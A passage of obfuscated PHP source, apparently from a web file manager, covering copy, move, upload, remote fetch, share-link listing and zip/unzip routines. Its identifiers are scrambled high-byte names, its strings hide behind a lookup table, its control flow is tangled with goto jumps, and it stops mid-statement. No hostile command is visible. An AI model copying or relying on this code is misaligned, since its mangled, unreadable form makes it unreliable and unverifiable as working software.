$F…é·ƒØ·¦[$c¬à×âçŠ„[391]]; for ($b¾öé—’¼Â = 0; $b¾öé—’¼Â < count($F…é·ƒØ·¦[$c¬à×âçŠ„[1139]]); $b¾öé—’¼Â++) { $f‘¡«ÖÛÑ = $F…é·ƒØ·¦[$c¬à×âçŠ„[1139]][$b¾öé—’¼Â]; $E¼İ”ãÚ…Ê = $this->model->mkdir($E¼İ”ãÚ…Ê, $f‘¡«ÖÛÑ, $eº½Œ¬Ó–¹); } return $this->getPathOuter($E¼İ”ãÚ…Ê); } public function copyFile($eğµ±ãƒÖ÷, $B†ËäÍÛ¿Ê, $f‡´·İ½¼Ä = REPEAT_REPLACE) { $Dèô¤ÁÕÖğ =& $_SERVER[±á õÁ]; $F·ë¢…ßá½ = $this->parse($B†ËäÍÛ¿Ê); $c¾‘Ø„˜³ = $this->model->copy($eğµ±ãƒÖ÷, $F·ë¢…ßá½[$Dèô¤ÁÕÖğ[391]], $f‡´·İ½¼Ä, $F·ë¢…ßá½[$Dèô¤ÁÕÖğ[85]]); return $c¾‘Ø„˜³ ? $this->getPathOuter($c¾‘Ø„˜³) : !1; } public function moveFile($CÖÑÚ¯²Ôò, $a’îÉ°Èø, $c»Ì¼‚ÆÍœ = REPEAT_REPLACE) { $EÑ¥ñÂ­‰¤ =& $_SERVER[±á õÁ]; $Dâ‘»äíÁ = $this->parse($a’îÉ°Èø); $F®‹Ñ‹¤Œ¡ = $this->model->move($CÖÑÚ¯²Ôò, $Dâ‘»äíÁ[$EÑ¥ñÂ­‰¤[391]], $c»Ì¼‚ÆÍœ, $Dâ‘»äíÁ[$EÑ¥ñÂ­‰¤[85]]); return $F®‹Ñ‹¤Œ¡ ? $this->getPathOuter($F®‹Ñ‹¤Œ¡) : !1; } public function copy($FòøÜ¿‹É, $FùÈ°¦×µ‚, $e®÷òƒğ¢ = REPEAT_REPLACE) { $C›À¿‘İ¦Ü = $this->parse($FùÈ°¦×µ‚); $aÒ ƒÓ‹‡ = $this->model->copy($FòøÜ¿‹É, $C›À¿‘İ¦Ü[$_SERVER[±á õÁ][391]], $e®÷òƒğ¢); return $aÒ ƒÓ‹‡ ? $this->getPathOuter($aÒ ƒÓ‹‡) : !1; } public function moveSameAllow() { } public function move($c„ñ‘íâÓÂ, $EÇ¬À¾Ğñœ, $aÒ·˜›¡¯é = REPEAT_REPLACE) { $c•˜å†•÷ = $this->parse($EÇ¬À¾Ğñœ); $DæÎİ¿ãË‡ = $this->model->move($c„ñ‘íâÓÂ, $c•˜å†•÷[$_SERVER[±á õÁ][391]], $aÒ·˜›¡¯é); return $DæÎİ¿ãË‡ ? $this->getPathOuter($DæÎİ¿ãË‡) : !1; } public function remove($Eª×‰ìàöÛ, $cÛÆä’Î = true) { return $this->model->remove($Eª×‰ìàöÛ, $cÛÆä’Î); } public function rename($f’®ïËƒÅÌ, $b‘Ç£’¾Ÿİ) { $a¾¨ÒÖæñƒ = $this->model->rename($f’®ïËƒÅÌ, $b‘Ç£’¾Ÿİ); return $a¾¨ÒÖæñƒ ? $this->getPathOuter($f’®ïËƒÅÌ) : $a¾¨ÒÖæñƒ; } public function size($cšÏ×™¡ª) { $d—»‘åÈàŞ = $this->infoSimple($cšÏ×™¡ª); return $d—»‘åÈàŞ ? $d—»‘åÈàŞ[$_SERVER[±á õÁ][87]] : 0; } public function infoSimple($C÷Ó„¾å) { return $this->model->sourceInfo($C÷Ó„¾å); } public function info($EÕ†‡ÊùÍô) { return $this->infoParse($EÕ†‡ÊùÍô); } public function infoAuth($C†–ê¯¶) { return $this->infoParse($C†–ê¯¶, !1, !0); } public function infoWithChildren($D‘é…Š×‰ö) { return $this->infoParse($D‘é…Š×‰ö, !0); } protected function infoParse($càù¬‡´Û›, $CˆÌ½áÉ¿ = false, $F™Ú’àÒÃ = false) { if (!$CˆÌ½áÉ¿) { return $this->model->pathInfo($càù¬‡´Û›, $F™Ú’àÒÃ); } return $this->model->pathInfoMore($càù¬‡´Û›); } public function infoFull($Fì‚´ØŒÉ—) { $e¸‘êñ–« =& $_SERVER[±á õÁ]; $FÎ±‡ñ¸ = explode($e¸‘êñ–«[8], $Fì‚´ØŒÉ—); $cÌ÷ã—°‚Í = implode($e¸‘êñ–«[8], array_splice($FÎ±‡ñ¸, 1)); return $this->model->pathInfoByPath($FÎ±‡ñ¸[0], $cÌ÷ã—°‚Í); } public function hashSimple($bÍê‹ƒˆ) { $a¯–é—‘Î¨ =& $_SERVER[±á õÁ]; $EòÇË‚ªã = $this->infoWithChildren($bÍê‹ƒˆ); return $EòÇË‚ªã[$a¯–é—‘Î¨[171]][$a¯–é—‘Î¨[178]]; } public function hashMd5($b¨ôŒ¯åË‰) { $dÊÍëÅ¡÷ =& $_SERVER[±á õÁ]; $AÛÜ‰ß‘¨Ë = $this->infoWithChildren($b¨ôŒ¯åË‰); return $AÛÜ‰ß‘¨Ë[$dÊÍëÅ¡÷[171]][$dÊÍëÅ¡÷[177]]; } public function exist($eîõ®ŒÎ) { $aÇÌ­š =& $_SERVER[±á õÁ]; $F¡ÁšÂÂ‹… = $this->parse($eîõ®ŒÎ); if (!$F¡ÁšÂÂ‹…[$aÇÌ­š[85]]) { return $this->isFile($eîõ®ŒÎ) || $this->isFolder($eîõ®ŒÎ); } $eÎÛ˜„Úè = array($aÇÌ­š[392] => $F¡ÁšÂÂ‹…[$aÇÌ­š[391]], $aÇÌ­š[38] => $F¡ÁšÂÂ‹…[$aÇÌ­š[85]]); $eÉâÀÒ¦º¯ = $this->model->where($eÎÛ˜„Úè)->find(); return $eÉâÀÒ¦º¯ ? !0 : !1; } public function isFile($cÏ¹õ•À¸Ï) { $b‚ãŸğÀáË =& $_SERVER[±á õÁ]; $C¾½áºù© = $this->infoSimple($cÏ¹õ•À¸Ï); return $C¾½áºù© && $C¾½áºù©[$b‚ãŸğÀáË[394]] == $b‚ãŸğÀáË[93] ? !1 : !0; } public function isFolder($fËµÉ²çÍÄ) { $fÆæø©… =& $_SERVER[±á õÁ]; $eÈí…ìÙ¾ = $this->infoSimple($fËµÉ²çÍÄ); return $eÈí…ìÙ¾ && $eÈí…ìÙ¾[$fÆæø©…[394]] == $fÆæø©…[93] ? !0 : !1; } public function listPath($fÙÎˆ¥ì¨´, $dÛˆ°Ÿ× = false) { $B¨‡ë’ =& $_SERVER[±á õÁ]; if ($fÙÎˆ¥ì¨´ == $B¨‡ë’[43]) { return !1; } $b¥èºÉ½ = array($B¨‡ë’[392] => $fÙÎˆ¥ì¨´); if ($dÛˆ°Ÿ×) { return $this->model->listSource($b¥èºÉ½, -1); } return $this->model->listSource($b¥èºÉ½); } public function has($Cà¸åŞ°Şå, $cÇ¥¬Ä—Š‘ = false, $Fæ‹ªí = null) { $Dî™Û—˜‹Ÿ =& $_SERVER[±á õÁ]; $F£Ü÷Àäà‰ = $this->infoWithChildren($Cà¸åŞ°Şå); if ($cÇ¥¬Ä—Š‘) { return array($Dî™Û—˜‹Ÿ[210] => $F£Ü÷Àäà‰[$Dî™Û—˜‹Ÿ[210]], $Dî™Û—˜‹Ÿ[209] => $F£Ü÷Àäà‰[$Dî™Û—˜‹Ÿ[209]]); } return $Fæ‹ªí ? $F£Ü÷Àäà‰[$Dî™Û—˜‹Ÿ[210]] : $F£Ü÷Àäà‰[$Dî™Û—˜‹Ÿ[209]]; } public function listAll($BÏšŠà¶£‡) { $FéèªµìÓ = IO::info($this->pathParse[$_SERVER[±á õÁ][85]]); if (!$FéèªµìÓ) { return array(); } return $this->model->listAll($BÏšŠà¶£‡); } public function getContent($A‚ïŠóµè) { return $this->model->getContent($A‚ïŠóµè); } public function setContent($Bññµ­»¥, $A¢î˜™Àäë = '') { return $this->model->setContent($Bññµ­»¥, $A¢î˜™Àäë); } public function fileSubstr($Fù„Õ´êŠ, $fÄ‡¬¥¬½, $EÂõá…§î) { return $this->model->fileSubstr($Fù„Õ´êŠ, $fÄ‡¬¥¬½, $EÂõá…§î); } public function download($b‹ªÂ–ÈîÑ, $Fé¿Ãã‚î› = '') { $dÌÅ Ç™Ç = get_path_father($Fé¿Ãã‚î›); $FÖŒ²¢é¹Š = get_path_this($Fé¿Ãã‚î›); $d‚ËóÚ™‡º = $this->model->fileInfoGet($b‹ªÂ–ÈîÑ); $D¨£ˆÈ Ï¤ = IO::copy($d‚ËóÚ™‡º[$_SERVER[±á õÁ][85]], $dÌÅ Ç™Ç, !1, $FÖŒ²¢é¹Š); return $D¨£ˆÈ Ï¤; } public function setModifyTime($aê±ƒ¯£ôò, $E®“„˜ëŠ = '') { $this->model->metaSet($aê±ƒ¯£ôò, $_SERVER[±á õÁ][1140], $E®“„˜ëŠ); } public function upload($Eïà˜ìÕÒŞ, $cŞê ÛÂªÎ, $d‡¼˜®¾‹› = false, $E¼ù ÂÓ²´ = REPEAT_REPLACE) { $DÀÃµ—Ëàï =& $_SERVER[±á õÁ]; $BÃ»é»¦Ü = $this->parse($Eïà˜ìÕÒŞ); $C¾¨ôï¹‹â = $this->model->addFile($BÃ»é»¦Ü[$DÀÃµ—Ëàï[391]], $cŞê ÛÂªÎ, $BÃ»é»¦Ü[$DÀÃµ—Ëàï[85]], $d‡¼˜®¾‹›, $E¼ù ÂÓ²´); return $this->getPathOuter($C¾¨ôï¹‹â); } public function uploadFileByID($fïŠªÜÉ†¼, $e”éƒÅäÔ, $b¤¥àˆï¶â) { $bïÓÉáÛ¦§ =& $_SERVER[±á õÁ]; $Eğ³µîÀ„ = $this->parse($fïŠªÜÉ†¼); $cÌœäÍĞÊ = $this->model->addFileByFileID($Eğ³µîÀ„[$bïÓÉáÛ¦§[391]], $e”éƒÅäÔ, $Eğ³µîÀ„[$bïÓÉáÛ¦§[85]], $b¤¥àˆï¶â); return $this->getPathOuter($cÌœäÍĞÊ); } public function addFileByRemote($Bá„ŒöÓ¹„, $Aİ–Îâ‡°ç, $DøôÍĞÄ¿ = array(), $fÜ÷ìËÔ = '', $F½”´¾ƒ¦˜) { $dÍìŠ°Ôµ³ =& $_SERVER[±á õÁ]; $F¢¹¶íŠ = $this->parse($Bá„ŒöÓ¹„); $fÜ÷ìËÔ = empty($fÜ÷ìËÔ) ? $F¢¹¶íŠ[$dÍìŠ°Ôµ³[85]] : $fÜ÷ìËÔ; $FÓÒÑÑ£ĞÁ = $this->model->addFileByRemote($F¢¹¶íŠ[$dÍìŠ°Ôµ³[391]], $Aİ–Îâ‡°ç, $fÜ÷ìËÔ, $DøôÍĞÄ¿, $F½”´¾ƒ¦˜); return $this->getPathOuter($FÓÒÑÑ£ĞÁ); } public function uploadLink($cØ“ñˆõî, $EÍÃ‰¢ÄÛÏ = 0) { $A³‰ÊÀÅŠ =& $_SERVER[±á õÁ]; $EÍë ã×££ = $this->parse($cØ“ñˆõî); $cØ“ñˆõî = Model($A³‰ÊÀÅŠ[568])->createFileName($EÍë ã×££[$A³‰ÊÀÅŠ[85]]); $c¿İÆæ¯Æõ = IO::uploadLink($cØ“ñˆõî, $EÍÃ‰¢ÄÛÏ); return $c¿İÆæ¯Æõ; } public function fileNameAuto($fÁŠ‚“ŞÚ‰, $AéŞ¬ßîå, $fïÛ½ÔŸ‰ = REPEAT_REPLACE, $d¶Œ‹ÊëÌ• = false) { return $this->model->fileNameAuto($fÁŠ‚“ŞÚ‰, $AéŞ¬ßîå, $fïÛ½ÔŸ‰, $d¶Œ‹ÊëÌ•); } public function fileNameExist($FÉ¿ñÃÔ‡È, $cˆ”ê¡’âö) { return $this->model->fileNameExist($FÉ¿ñÃÔ‡È, $cˆ”ê¡’âö); } protected function _fileOut($B«È±»ÊÚô, $bî®¡„ÍÖù = false, $d§ˆ‘‰’ïš = false, $EÇÖ½£ÒğŸ = '', $D†ÄóÚ…©¦ = false) { goto Cò¥Óƒ‘; Cò¥Óƒ‘: $fÃ³ Š¯Éª =& $_SERVER[±á õÁ]; $bòÃ–¯ˆº‰ = $this->model->sourceInfo($B«È±»ÊÚô); if ($bòÃ–¯ˆº‰[$fÃ³ Š¯Éª[394]] == $fÃ³ Š¯Éª[93]) { header($fÃ³ Š¯Éª[1141]); die; } goto Eì¦«áĞ…; Eì¦«áĞ…: $C—ŠáÙ“Ü  = $this->model->fileInfoGet($B«È±»ÊÚô); $EÇÖ½£ÒğŸ = $C—ŠáÙ“Ü [$fÃ³ Š¯Éª[177]] ? $C—ŠáÙ“Ü [$fÃ³ Š¯Éª[177]] : $EÇÖ½£ÒğŸ; $A›ÌÀÆœ¼… = isset($GLOBALS[$fÃ³ Š¯Éª[1142]]) ? $GLOBALS[$fÃ³ Š¯Éª[1142]] : $bòÃ–¯ˆº‰[$fÃ³ Š¯Éª[38]]; goto DšàªÌ‡ºÚ; DšàªÌ‡ºÚ: if ($D†ÄóÚ…©¦) { return IO::fileOutServer($C—ŠáÙ“Ü [$fÃ³ Š¯Éª[85]], $bî®¡„ÍÖù, $A›ÌÀÆœ¼…, $EÇÖ½£ÒğŸ); } IO::fileOut($C—ŠáÙ“Ü [$fÃ³ Š¯Éª[85]], $bî®¡„ÍÖù, $A›ÌÀÆœ¼…, $EÇÖ½£ÒğŸ); goto Dº±ñ÷ŠÙà; Dº±ñ÷ŠÙà: } public function fileOut($Dë†ŸŞÇ, $BÄ¯Šâ¤Òà = false, $bÑ·Œ¸Óß = false, $d«£¨¨Şã = '') { $this->_fileOut($Dë†ŸŞÇ, $BÄ¯Šâ¤Òà, $bÑ·Œ¸Óß, $d«£¨¨Şã); } public function fileOutServer($bàÒÉİäø÷, $bÚô£„ã‡ç = false, $c‚“¼š††Ì = false, $bàÜ… ·˜ = '') { $this->_fileOut($bàÒÉİäø÷, $bÚô£„ã‡ç, $c‚“¼š††Ì, $bàÜ… ·˜, !0); } protected function _fileOutImage($CÊí‚¹Õ´Ü, $Cäó°İ˜ = 250) { goto dä¡†ºì; dä¡†ºì: $Dßô£Ì‰ÛÔ =& $_SERVER[±á õÁ]; $D“õ “¾¨ = $this->model->pathInfo($CÊí‚¹Õ´Ü); if ($D“õ “¾¨[$Dßô£Ì‰ÛÔ[394]] == $Dßô£Ì‰ÛÔ[93]) { show_json($Dßô£Ì‰ÛÔ[1143] . $CÊí‚¹Õ´Ü, !1); } goto Dê‡ó”ˆæ„; Dê‡ó”ˆæ„: $A†â½àß¥Í = $this->model->fileInfoGet($CÊí‚¹Õ´Ü); $A†â½àß¥Í[$Dßô£Ì‰ÛÔ[38]] = $D“õ “¾¨[$Dßô£Ì‰ÛÔ[38]]; $A†â½àß¥Í[$Dßô£Ì‰ÛÔ[170]] = $D“õ “¾¨[$Dßô£Ì‰ÛÔ[170]]; goto cÃœİõš·‘; cÃœİõš·‘: $GLOBALS[$Dßô£Ì‰ÛÔ[1142]] = $A†â½àß¥Í[$Dßô£Ì‰ÛÔ[38]]; $GLOBALS[$Dßô£Ì‰ÛÔ[169]] = $A†â½àß¥Í; IO::fileOutImage($A†â½àß¥Í[$Dßô£Ì‰ÛÔ[85]], $Cäó°İ˜); goto bÈÄÂÊÜÊÇ; bÈÄÂÊÜÊÇ: } public function fileOutImage($f½„£å¹Ÿ, $c‘˜›‘Áß¯ = 250) { $this->_fileOutImage($f½„£å¹Ÿ, $c‘˜›‘Áß¯); } public function fileOutImageServer($a»‰é¨ƒìù, $DŒ¿­ª¥¨ = 250) { $this->_fileOutImage($a»‰é¨ƒìù, $DŒ¿­ª¥¨); } public function link($F–¤ÒºåŸô, $fÖèÆ—Ö©½ = '') { $AŸó¾¹Ç¾ê = $this->model->fileInfoGet($F–¤ÒºåŸô); return IO::link($AŸó¾¹Ç¾ê[$_SERVER[±á õÁ][85]], $fÖèÆ—Ö©½); } protected function parse($Fé šîé©–) { $E®ãÁÌ±´ô =& $_SERVER[±á õÁ]; if (strstr($Fé šîé©–, $E®ãÁÌ±´ô[8]) === !1) { return array($E®ãÁÌ±´ô[409] => intval($Fé šîé©–), $E®ãÁÌ±´ô[85] => $E®ãÁÌ±´ô[43], $E®ãÁÌ±´ô[1139] => array()); } $dßï”«éµƒ = explode($E®ãÁÌ±´ô[8], trim($Fé šîé©–, $E®ãÁÌ±´ô[8])); if (count($dßï”«éµƒ) < 2) { show_tips($Fé šîé©– . $E®ãÁÌ±´ô[1144]); } return array($E®ãÁÌ±´ô[409] => intval($dßï”«éµƒ[0]), $E®ãÁÌ±´ô[85] => $dßï”«éµƒ[1], $E®ãÁÌ±´ô[1139] => array_slice($dßï”«éµƒ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Fõª†Ä¯ãÓ) { $this->pathParse = $Fõª†Ä¯ãÓ; $this->model = Model($_SERVER[±á õÁ][1138]); } public function getPathOuter($aá¿æè‡“â) { $bŞÌæÔ¤×Ù =& $_SERVER[±á õÁ]; if (!$aá¿æè‡“â) { return $aá¿æè‡“â; } $CõÜ’¨ãçô = $this->parse($aá¿æè‡“â); return trim(KodIO::makeShare($this->pathParse[$bŞÌæÔ¤×Ù[391]], $CõÜ’¨ãçô[$bŞÌæÔ¤×Ù[391]]), $bŞÌæÔ¤×Ù[8]); } protected function infoParse($eŠ§¯éæöÏ, $AŠ„é°‹ø— = false, $b³›«ŞÎŞ = false) { $B™ŸìÛŠ =& $_SERVER[±á õÁ]; $Fñª®é¥´ñ = $this->pathParse[$B™ŸìÛŠ[391]]; $f‚Ş‰ñ¢š = trim($this->pathParse[$B™ŸìÛŠ[1034]], $B™ŸìÛŠ[8]); return Action($B™ŸìÛŠ[1145])->sharePathInfo($Fñª®é¥´ñ, $f‚Ş‰ñ¢š); } public function infoFull($D©©¹ˆù½¯) { $E´Å—·İŒ• =& $_SERVER[±á õÁ]; $CÜ–˜Ø§½ = explode($E´Å—·İŒ•[8], trim($D©©¹ˆù½¯, $E´Å—·İŒ•[8])); if (count($CÜ–˜Ø§½) > 1) { $F¼ÛÆóçŞ± = implode($E´Å—·İŒ•[8], array_splice($CÜ–˜Ø§½, 1)); $C–©¿¶‰¡­ = $this->model->pathInfoByPath($CÜ–˜Ø§½[0], $F¼ÛÆóçŞ±); if (!$C–©¿¶‰¡­) { return !1; } $this->pathParse[$E´Å—·İŒ•[1034]] = $C–©¿¶‰¡­[$E´Å—·İŒ•[393]]; } return $this->infoParse($D©©¹ˆù½¯); } public function listAll($CéàÕñ‡¤–) { goto E™ùêæåò; a¡°Ã¤Æ¥‹: foreach ($Aåæ©°Ùó as &$d¨†èÇÇÎ) { check_abort(); $d¨†èÇÇÎ[$Eù÷èåÕÁ¿[415]] = $bçÙé’‘‡Ù->_shareItemeParse($d¨†èÇÇÎ[$Eù÷èåÕÁ¿[415]], $dÒáŒ›®«); } unset($d¨†èÇÇÎ); return $Aåæ©°Ùó; goto a¢Ã¬äÔæ; E™ùêæåò: $Eù÷èåÕÁ¿ =& $_SERVER[±á õÁ]; $B”®â†Úã = IO::info($this->pathParse[$Eù÷èåÕÁ¿[85]]); if (!$B”®â†Úã) { return array(); } goto e³’ğ‡¯ˆ®; e³’ğ‡¯ˆ®: $Aåæ©°Ùó = $this->model->listAll($CéàÕñ‡¤–); $dÒáŒ›®« = Model($Eù÷èåÕÁ¿[560])->getInfo($B”®â†Úã[$Eù÷èåÕÁ¿[464]]); $bçÙé’‘‡Ù = Action($Eù÷èåÕÁ¿[1145]); goto a¡°Ã¤Æ¥‹; a¢Ã¬äÔæ: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($A†ÔßŸºÃÛ) { $this->pathParse = $A†ÔßŸºÃÛ; $this->model = Model($_SERVER[±á õÁ][1138]); } protected function infoParse($a¤ëšÊ›¿†, $cæ…êˆ‘„ = false, $AéÂĞ¥í¦Ï = false) { $c–‹±Í³¬Ø =& $_SERVER[±á õÁ]; return Action($c–‹±Í³¬Ø[1040])->sharePathInfo($this->pathParse[$c–‹±Í³¬Ø[85]], !0); } public function listPath($C…™‡Ã²‡, $DÚ²ÒºÀîÚ = false) { $e‡óôŠÊÅÂ =& $_SERVER[±á õÁ]; $A˜ªˆ¿Ø¬´ = parent::listPath($C…™‡Ã²‡, $DÚ²ÒºÀîÚ); foreach ($A˜ªˆ¿Ø¬´ as $eµö¼‚­„Ÿ => $EõÈõä”“õ) { if (!in_array($eµö¼‚­„Ÿ, array($e‡óôŠÊÅÂ[83], $e‡óôŠÊÅÂ[84]))) { continue; } foreach ($EõÈõä”“õ as $bÛ¬Å—æî => $EÕ†Ä†º–õ) { $A˜ªˆ¿Ø¬´[$eµö¼‚­„Ÿ][$bÛ¬Å—æî] = Action($e‡óôŠÊÅÂ[1040])->shareItemInfo($EÕ†Ä†º–õ); } } return $A˜ªˆ¿Ø¬´; } public function listAll($C„Ÿœ®¡†) { goto b¦âÃŒ½Ë; Bš‡«´¨æ: return $F¿£‰éî²; goto bÅ™†Í§ã½; Eµ‰¼Éø™Ó: $F¿£‰éî² = $this->model->listAll($C„Ÿœ®¡†); foreach ($F¿£‰éî² as &$f“¬•ÌñÖÖ) { $f“¬•ÌñÖÖ[$cÊÈçÕ†œ²[415]] = Action($cÊÈçÕ†œ²[1040])->shareItemInfo($f“¬•ÌñÖÖ[$cÊÈçÕ†œ²[415]]); } unset($f“¬•ÌñÖÖ); goto Bš‡«´¨æ; b¦âÃŒ½Ë: $cÊÈçÕ†œ² =& $_SERVER[±á õÁ]; $AµÁæ¬´˜ = IO::info($this->pathParse[$cÊÈçÕ†œ²[85]]); if (!$AµÁæ¬´˜) { return array(); } goto Eµ‰¼Éø™Ó; bÅ™†Í§ã½: } } goto Cò‹ÍŒÈÜ; DÜÃ‰ÄÀœ¢: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $bòèñ‹¿Ù÷; if (!$bòèñ‹¿Ù÷) { $d˜·èÎœ‘· = IO::init($_SERVER[±á õÁ][8]); } return $d˜·èÎœ‘·; } private static function iconvSystem($b‹äâ¬¬Ì‹) { return self::local()->iconvSystem($b‹äâ¬¬Ì‹); } private static function iconvApp($A›²¤§ÒÓå) { return self::local()->iconvApp($A›²¤§ÒÓå); } public static function zip($cñíâ‰öØñ, $d¶ß¾××‚œ = "\x7a\x69\160", $EƒİŒ›’ë˜ = '', $eÍÛ„å—¢§ = REPEAT_RENAME) { goto AƒØ‹Åß¿Â; B¾˜«ÒŒ¯¾: foreach ($fÆ‘Äë¡î as $d“ŸÕ³¨‘× => $f•´ÛËŠ¼©) { $fÆ‘Äë¡î[$d“ŸÕ³¨‘×] = self::iconvSystem($f•´ÛËŠ¼©); } KodArchive::create($cå­ĞÚÃÖÜ, $fÆ‘Äë¡î); if (!IO::exist($e‚ª¹…çâÚ)) { if ($f­Õ·‚¢µ) { del_dir($f­Õ·‚¢µ); } show_json(LNG($eŞ…Ğ«ØŸ[1049]), !1); } goto bÖ„°ÃªªÖ; cÙ¸é´ï‘È: if (!$aŠö÷†Ğ†Æ) { del_dir($f­Õ·‚¢µ); show_json(LNG($eŞ…Ğ«ØŸ[1049]), !1); } del_dir($f­Õ·‚¢µ); return $aŠö÷†Ğ†Æ; goto dĞ´Ší°¬®; AƒØ‹Åß¿Â: $eŞ…Ğ«ØŸ =& $_SERVER[±á õÁ]; $DæÓ¾šÅ¯‘ = self::init($cñíâ‰öØñ[0][$eŞ…Ğ«ØŸ[85]]); $B‹ùïœÒËî = self::info($cñíâ‰öØñ[0][$eŞ…Ğ«ØŸ[85]]); goto A´ñ®ª‘; EâõŞš¶çÓ: $e‚ª¹…çâÚ = $F„µäŞ‚»‚ . $c–‚–í‰ÉÔ . $eŞ…Ğ«ØŸ[101] . $d¶ß¾××‚œ; $e‚ª¹…çâÚ = get_filename_auto($e‚ª¹…çâÚ, $eŞ…Ğ«ØŸ[43], $eÍÛ„å—¢§); $cå­ĞÚÃÖÜ = self::iconvSystem($e‚ª¹…çâÚ); goto B¾˜«ÒŒ¯¾; bÖ„°ÃªªÖ: if ($EƒİŒ›’ë˜ || !$f­Õ·‚¢µ) { if ($f­Õ·‚¢µ && strstr($f­Õ·‚¢µ, TEMP_FILES)) { $e­­ŞêĞˆë = $fÆ‘Äë¡î = array(); recursion_dir($F„µäŞ‚»‚, $e­­ŞêĞˆë, $fÆ‘Äë¡î, 0); foreach ($e­­ŞêĞˆë as $eÏ°ˆöİ·Ÿ) { del_dir($eÏ°ˆöİ·Ÿ); } foreach ($fÆ‘Äë¡î as $fÊ›İˆæÂ§) { if ($fÊ›İˆæÂ§ == $cå­ĞÚÃÖÜ) { continue; } del_file($fÊ›İˆæÂ§); } } return $e‚ª¹…çâÚ; } $CÙ†ã ™Ø‰ = self::pathFather($B‹ùïœÒËî[$eŞ…Ğ«ØŸ[85]]); $aŠö÷†Ğ†Æ = self::move($e‚ª¹…çâÚ, $CÙ†ã ™Ø‰, $eÍÛ„å—¢§); goto cÙ¸é´ï‘È; A´ñ®ª‘: $f­Õ·‚¢µ = !1; if (!$EƒİŒ›’ë˜ && $DæÓ¾šÅ¯‘->getType() == $eŞ…Ğ«ØŸ[112]) { $fÆ‘Äë¡î = self::zipFileList($cñíâ‰öØñ); } else { $f­Õ·‚¢µ = $EƒİŒ›’ë˜ ? $EƒİŒ›’ë˜ : TEMP_FILES . $eŞ…Ğ«ØŸ[1047] . time() . rand_string(8) . $eŞ…Ğ«ØŸ[8]; mk_dir($f­Õ·‚¢µ); $fÆ‘Äë¡î = self::zipFileList($cñíâ‰öØñ, $f­Õ·‚¢µ); } $c–‚–í‰ÉÔ = $B‹ùïœÒËî[$eŞ…Ğ«ØŸ[38]]; goto b¾ìÛŒ³ñß; b¾ìÛŒ³ñß: if (count($fÆ‘Äë¡î) > 1) { $Bó—°£ö¦¦ = IO::info(IO::pathFather($B‹ùïœÒËî[$eŞ…Ğ«ØŸ[85]])); $c–‚–í‰ÉÔ = $Bó—°£ö¦¦[$eŞ…Ğ«ØŸ[38]]; } $F„µäŞ‚»‚ = $f­Õ·‚¢µ; if (!$F„µäŞ‚»‚) { $F„µäŞ‚»‚ = get_path_father($B‹ùïœÒËî[$eŞ…Ğ«ØŸ[85]]); if (!$EƒİŒ›’ë˜ && $DæÓ¾šÅ¯‘->getType() == $eŞ…Ğ«ØŸ[112]) { $F„µäŞ‚»‚ = get_path_father($DæÓ¾šÅ¯‘->path); } $bâöò²ˆë” = IO::info($F„µäŞ‚»‚); if (!$bâöò²ˆë”[$eŞ…Ğ«ØŸ[202]]) { show_json(LNG($eŞ…Ğ«ØŸ[1048]), !1); } } goto EâõŞš¶çÓ; dĞ´Ší°¬®: } public static function unzip($eŠŞ¦Ù›ó, $c‹ˆ¤ÎÑíö = "\x72\145\160\154\x61\143\145") { goto cÒ¹¯×¹Ô; cÒ¹¯×¹Ô: $C¶†ßƒš¢… =& $_SERVER[±á õÁ]; $cÀ©„ªèÃ = $eŠŞ¦Ù›ó[$C¶†ßƒš¢…[85]]; $C¹¬Ã¯‰Ê³ = $eŠŞ¦Ù›ó[$C¶†ßƒš¢…[1050]]; goto CŠ¾ÉµŒğŸ; dª‚ÖÉÅ§¶: $FéÙæßôÉ” = self::tmpFileName($Fº„ÈØµÊÓ); $Dá¥„õ¤Ï› = TEMP_FILES . $FéÙæßôÉ”; del_dir($Dá¥„õ¤Ï›); goto A°¢«Üµ°É; f‘‘³ææ¢®: Hook::trigger($C¶†ßƒš¢…[1057], $Dá¥„õ¤Ï›); recursion_dir($Dá¥„õ¤Ï›, $E‹Èö£ØËÙ, $få†ŠÅÓÀ¹, 0); $CÎàÏ­åî = array_merge($E‹Èö£ØËÙ, $få†ŠÅÓÀ¹); goto D­ˆ”âéæ; EŠªÊŠÁ‘: return !0; goto F¬î‘íÙÀˆ; D­ˆ”âéæ: foreach ($CÎàÏ­åî as $eŒšøÕå¬¶) { $eŒšøÕå¬¶ = self::iconvApp($eŒšøÕå¬¶); self::move($eŒšøÕå¬¶, $C¹¬Ã¯‰Ê³, $c‹ˆ¤ÎÑíö); } del_dir($Dá¥„õ¤Ï›); if (!$b¿‘˜¢­ã) { del_file($aŒÛ Ê•¿); } goto EŠªÊŠÁ‘; A°¢«Üµ°É: mk_dir($Dá¥„õ¤Ï›); $f›ö÷ù‘ = self::fileExt($Fº„ÈØµÊÓ); $aŒÛ Ê•¿ = $Dá¥„õ¤Ï› . $C¶†ßƒš¢…[101] . $f›ö÷ù‘; goto F¿‡Ç¾‹Ãš; D’ø£Ñ‡óñ: $cóÖÙ˜Œâ = KodArchive::extract($aŒÛ Ê•¿, $Dá¥„õ¤Ï› . $C¶†ßƒš¢…[8], $C÷½ ¼•ˆ”); self::archiveExt(); if (!$cóÖÙ˜Œâ[$C¶†ßƒš¢…[1054]]) { show_json($C¶†ßƒš¢…[1055] . $cóÖÙ˜Œâ[$C¶†ßƒš¢…[1056]], !1); } goto f‘‘³ææ¢®; CŠ¾ÉµŒğŸ: if (!($Fº„ÈØµÊÓ = parent::info($cÀ©„ªèÃ))) { show_json(LNG($C¶†ßƒš¢…[1051]), !1); } if (!($e‡¦”÷ùì = parent::infoFull($C¹¬Ã¯‰Ê³))) { $C¹¬Ã¯‰Ê³ = parent::mkdir($C¹¬Ã¯‰Ê³); $e‡¦”÷ùì = array($C¶†ßƒš¢…[85] => $C¹¬Ã¯‰Ê³); } else { if (isset($e‡¦”÷ùì[$C¶†ßƒš¢…[393]]) && trim($e‡¦”÷ùì[$C¶†ßƒš¢…[85]], $C¶†ßƒš¢…[8]) != trim($C¹¬Ã¯‰Ê³, $C¶†ßƒš¢…[8])) { $c•åïİœó§ = KodIO::make($e‡¦”÷ùì[$C¶†ßƒš¢…[486]]); $C±¿ ™´Ü = parent::fileNameAuto($c•åïİœó§, $e‡¦”÷ùì[$C¶†ßƒš¢…[38]], REPEAT_RENAME_FOLDER, !0); $C¹¬Ã¯‰Ê³ = parent::mkdir($c•åïİœó§ . $C±¿ ™´Ü); $e‡¦”÷ùì = 